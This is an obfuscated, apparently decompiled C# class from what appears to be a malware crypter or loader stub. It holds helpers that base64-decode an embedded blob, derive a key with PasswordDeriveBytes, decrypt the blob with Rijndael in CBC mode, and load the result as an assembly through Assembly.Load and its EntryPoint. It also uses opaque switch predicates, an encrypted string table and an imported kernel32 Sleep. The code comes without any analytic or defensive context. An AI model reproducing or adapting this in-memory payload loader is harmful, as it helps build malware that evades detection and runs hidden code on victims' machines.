using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.MemoryManagement;
using ns2;

namespace ns1;

internal sealed class Class7
{
	static Encoding smethod_0(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 104:
				return Encoding.ASCII;
			}
		}
	}

	static double smethod_1(double double_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 20:
				return Math.Round(double_0);
			}
		}
	}

	static byte[] smethod_2(string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 30:
				return Convert.FromBase64String(string_0);
			}
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern void Sleep(long long_0);

	static bool smethod_3(string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 28:
				return string.IsNullOrEmpty(string_0);
			}
		}
	}

	static void smethod_4()
	{
		try
		{
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				MemoryManager.memoryManager_0 = new MemoryManager();
			}
		}
		catch
		{
		}
	}

	static int smethod_5(string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 2:
				return Conversions.ToInteger(string_0);
			}
		}
	}

	static void smethod_6(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 119:
				symmetricAlgorithm_0.Mode = cipherMode_0;
				return;
			}
		}
	}

	static byte[] smethod_7(Encoding encoding_0, string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 94:
				return encoding_0.GetBytes(string_0);
			}
		}
	}

	static byte[] smethod_8(PasswordDeriveBytes passwordDeriveBytes_0, int int_0, int int_1, int int_2)
	{
		while (true)
		{
			switch (int_2 ^ int_1)
			{
			case 102:
				return passwordDeriveBytes_0.GetBytes(int_0);
			}
		}
	}

	static MethodInfo smethod_9(Assembly assembly_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 55:
				return assembly_0.EntryPoint;
			}
		}
	}

	static string smethod_10(string string_0, string string_1, string string_2)
	{
		string strHashName = Class7.smethod_14(1158571505, 4);
		string string_3 = Class7.smethod_11(3, 291, 309);
		string string_4 = Class7.smethod_14(1158571392, 8);
		int num = 256;
		if (Class7.smethod_3(string_0, 894, 866))
		{
			return Class7.smethod_14(1158571500, 3);
		}
		byte[] byte_ = Class7.smethod_7(Class7.smethod_0(384, 488), string_4, 969, 919);
		byte[] rgbSalt = Class7.smethod_7(Class7.smethod_0(199, 175), string_2, 960, 926);
		byte[] array = Class7.smethod_2(string_0, 203, 213);
		PasswordDeriveBytes passwordDeriveBytes_ = new PasswordDeriveBytes(string_1, rgbSalt, strHashName, Class7.smethod_5(string_3, 932, 934));
		checked
		{
			byte[] byte_2 = Class7.smethod_8(passwordDeriveBytes_, (int)Class7.smethod_1((double)num / 8.0, 320, 340), 610, 516);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			Class7.smethod_6((SymmetricAlgorithm)rijndaelManaged, CipherMode.CBC, 992, 919);
			byte[] array2 = new byte[array.Length - 1 + 1];
			int count = 0;
			using (ICryptoTransform transform = Class7.smethod_13(rijndaelManaged, byte_2, byte_, 557, 569))
			{
				using MemoryStream memoryStream = new MemoryStream(array);
				using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
				count = cryptoStream.Read(array2, 0, array2.Length);
				memoryStream.Close();
				cryptoStream.Close();
			}
			rijndaelManaged.Clear();
			return Encoding.UTF8.GetString(array2, 0, count);
		}
	}

	static string smethod_11(int int_0, int int_1, int int_2)
	{
		while (true)
		{
			switch (int_2 ^ int_1)
			{
			case 22:
				return Conversions.ToString(int_0);
			}
		}
	}

	static Assembly smethod_12(byte[] byte_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 48:
				return Assembly.Load(byte_0);
			}
		}
	}

	static ICryptoTransform smethod_13(RijndaelManaged rijndaelManaged_0, byte[] byte_0, byte[] byte_1, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 20:
				return rijndaelManaged_0.CreateDecryptor(byte_0, byte_1);
			}
		}
	}

	static string smethod_14(int int_0, int int_1)
	{
		int num = int_0 ^ 0x450EB43F ^ int_1;
		char[] char_ = Class4.char_1;
		int num2 = char_[num];
		string result;
		if ((result = Class4.string_0[num2]) != null)
		{
			return result;
		}
		int num3 = char_[num + 1];
		num3 = (int)((uint)char_[num + 2] << 16) + num3;
		char[] array = new char[num3];
		char[] char_2 = Class4.char_0;
		int num4 = char_2.Length;
		num += 3;
		for (int num5 = 0; num5 < num3; num5 = 1 + num5)
		{
			array[num5] = (char)(char_[num + num5] ^ char_2[(num5 + num2) % num4]);
		}
		result = new string(array);
		Class4.string_0[num2] = result;
		return result;
	}
}
